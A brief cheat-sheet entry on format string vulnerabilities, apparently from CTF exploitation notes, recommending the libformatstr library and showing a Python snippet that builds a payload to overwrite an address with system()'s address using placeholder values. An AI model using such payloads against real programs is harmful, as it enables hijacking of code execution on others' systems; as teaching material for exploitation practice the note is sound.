Format String Vuln
==================

Probably the easiest to use tool turns out to be [libformatstr](https://github.com/hellman/libformatstr)

Install using `sudo pip install libformatstr`.

Most common usage:

```python
from libformatstr import FormatStr

addr = 0xdeadbeef
system_addr = 0xcafebabe

p = FormatStr()
p[addr] = system_addr

# buf is 14th argument, 4 bytes are already printed
print repr( p.payload(14, start_len=4) )
```
